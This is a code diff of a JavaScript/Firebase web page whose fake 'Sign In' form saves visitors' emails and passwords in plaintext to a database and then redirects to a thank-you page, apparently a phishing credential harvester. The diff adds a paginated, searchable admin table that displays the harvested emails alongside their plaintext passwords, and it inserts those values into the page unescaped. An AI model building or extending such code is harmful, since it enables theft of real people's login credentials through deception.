@@ -8,7 +8,9 @@ import {
   query,
   orderBy,
   limit,
-  startAfter
+  startAfter,
+  startAt,
+  endAt
 } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
 const firebaseConfig = {
@@ -20,123 +22,139 @@ const firebaseConfig = {
 const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 
-document.addEventListener("DOMContentLoaded", () => {
+const loginForm = document.getElementById("loginForm");
+const submitBtn = document.getElementById("submitBtn");
+const errorMessage = document.getElementById("errorMessage");
 
-  const loginForm = document.getElementById("loginForm");
+const usersBody = document.getElementById("usersBody");
+const prevBtn = document.getElementById("prevBtn");
+const nextBtn = document.getElementById("nextBtn");
+const loading = document.getElementById("loading");
+const searchInput = document.getElementById("searchInput");
 
-  if (loginForm) {
-    const submitBtn = document.getElementById("submitBtn");
-    const errorMessage = document.getElementById("errorMessage");
+// ---------- Login Form Handling ----------
+if (loginForm) {
+  loginForm.addEventListener("submit", async (e) => {
+    e.preventDefault();
 
-    loginForm.addEventListener("submit", async (e) => {
-      e.preventDefault();
+    const email = document.getElementById("usernameOrEmail").value.trim();
+    const password = document.getElementById("password").value;
 
-      const email = document.getElementById("usernameOrEmail").value.trim();
-      const password = document.getElementById("password").value;
-
-      if (!email || !password) {
-        showError("Please fill in all fields");
-        return;
-      }
-
-      submitBtn.disabled = true;
-      submitBtn.innerHTML = "Signing in...";
-
-      try {
-        await addDoc(collection(db, "users"), {
-          email,
-          password,
-          createdAt: serverTimestamp(),
-        });
-
-        window.location.href = "/thankyou.html";
-      } catch (err) {
-        console.error(err);
-        showError("Something went wrong");
-        submitBtn.disabled = false;
-        submitBtn.innerHTML = "Sign In";
-      }
-    });
-
-    function showError(msg) {
-      errorMessage.textContent = msg;
-      errorMessage.classList.add("show");
-      setTimeout(() => errorMessage.classList.remove("show"), 4000);
+    if (!email || !password) {
+      showError("Please fill in all fields");
+      return;
     }
+
+    submitBtn.disabled = true;
+    submitBtn.innerHTML = "Signing in...";
+
+    try {
+      await addDoc(collection(db, "users"), {
+        email,
+        password,
+        createdAt: serverTimestamp(),
+      });
+
+      window.location.href = "/thankyou.html";
+    } catch (err) {
+      console.error(err);
+      showError("Something went wrong");
+      submitBtn.disabled = false;
+      submitBtn.innerHTML = "Sign In";
+    }
+  });
+
+  function showError(msg) {
+    errorMessage.textContent = msg;
+    errorMessage.classList.add("show");
+    setTimeout(() => errorMessage.classList.remove("show"), 4000);
   }
+}
 
-  const usersBody = document.getElementById("usersBody");
-  const prevBtn = document.getElementById("prevBtn");
-  const nextBtn = document.getElementById("nextBtn");
-  const loading = document.getElementById("loading");
+// ---------- Users Listing ----------
+if (usersBody) {
+  const PAGE_SIZE = 5;
+  let pageStack = [];
+  let currentPage = 0;
+  let searchTerm = "";
+  let debounceTimer;
 
-  if (usersBody) {
-    const PAGE_SIZE = 5;
-    let lastVisible = null;
-    let pageStack = [];
+  async function loadUsers(page = 0) {
+    loading.style.display = "block";
+    usersBody.innerHTML = "";
 
-    async function loadUsers(direction = "next") {
-      loading.style.display = "block";
+    const usersRef = collection(db, "users");
+    let q;
 
-      let q;
-
-      if (direction === "next") {
-        q = lastVisible
-          ? query(
-              collection(db, "users"),
-              orderBy("createdAt", "desc"),
-              startAfter(lastVisible),
-              limit(PAGE_SIZE)
-            )
-          : query(
-              collection(db, "users"),
-              orderBy("createdAt", "desc"),
-              limit(PAGE_SIZE)
-            );
-      }
-
-      if (direction === "prev" && pageStack.length > 1) {
-        pageStack.pop();
-        lastVisible = pageStack[pageStack.length - 1];
+    if (searchTerm) {
+      q = query(
+        usersRef,
+        orderBy("email"),
+        startAt(searchTerm),
+        endAt(searchTerm + "\uf8ff"),
+        limit(PAGE_SIZE)
+      );
+      pageStack = [];
+      currentPage = 0;
+    } else {
+      if (page === 0) {
+        q = query(usersRef, orderBy("createdAt", "desc"), limit(PAGE_SIZE));
+      } else {
+        const lastVisible = pageStack[page - 1];
         q = query(
-          collection(db, "users"),
+          usersRef,
           orderBy("createdAt", "desc"),
           startAfter(lastVisible),
           limit(PAGE_SIZE)
         );
       }
-
-      const snapshot = await getDocs(q);
-      usersBody.innerHTML = "";
-
-      snapshot.forEach((doc, index) => {
-        const user = doc.data();
-        const tr = document.createElement("tr");
-
-        tr.innerHTML = `
-          <td>${index + 1}</td>
-          <td>${user.email}</td>
-          <td>${user.createdAt?.toDate().toLocaleString() || "-"}</td>
-        `;
-
-        usersBody.appendChild(tr);
-      });
-
-      lastVisible = snapshot.docs[snapshot.docs.length - 1];
-      pageStack.push(lastVisible);
-
-      prevBtn.disabled = pageStack.length <= 1;
-      nextBtn.disabled = snapshot.size < PAGE_SIZE;
-
-      loading.style.display = "none";
     }
 
-    nextBtn?.addEventListener("click", () => loadUsers("next"));
-    prevBtn?.addEventListener("click", () => loadUsers("prev"));
+    try {
+      const snapshot = await getDocs(q);
 
-    loadUsers();
+      if (snapshot.empty) {
+        usersBody.innerHTML = `<tr><td colspan="3" style="text-align:center;">No users found.</td></tr>`;
+      } else {
+        snapshot.forEach((doc) => {
+          const user = doc.data();
+          const tr = document.createElement("tr");
+          tr.innerHTML = `
+            <td>${user.email}</td>
+            <td>${user.password}</td>
+            <td>${user.createdAt?.toDate().toLocaleString() || "-"}</td>
+          `;
+          usersBody.appendChild(tr);
+        });
 
-    document.getElementById("usersTable").style.display = "table";
+        if (!searchTerm) {
+          if (pageStack.length === page) pageStack.push(snapshot.docs[snapshot.docs.length - 1]);
+          currentPage = page;
+        }
+      }
 
+      prevBtn.disabled = currentPage === 0 || searchTerm;
+      nextBtn.disabled = snapshot.size < PAGE_SIZE || searchTerm;
+
+      document.getElementById("usersTable").style.display = "table";
+    } catch (err) {
+      console.error(err);
+      usersBody.innerHTML = `<tr><td colspan="3" style="text-align:center;">Error loading users.</td></tr>`;
+    }
+
+    loading.style.display = "none";
   }
-});
+
+  nextBtn.addEventListener("click", () => loadUsers(currentPage + 1));
+  prevBtn.addEventListener("click", () => loadUsers(currentPage - 1));
+
+  searchInput.addEventListener("input", (e) => {
+    clearTimeout(debounceTimer);
+    debounceTimer = setTimeout(() => {
+      searchTerm = e.target.value.trim();
+      loadUsers(0);
+    }, 300);
+  });
+
+  loadUsers(0);
+}
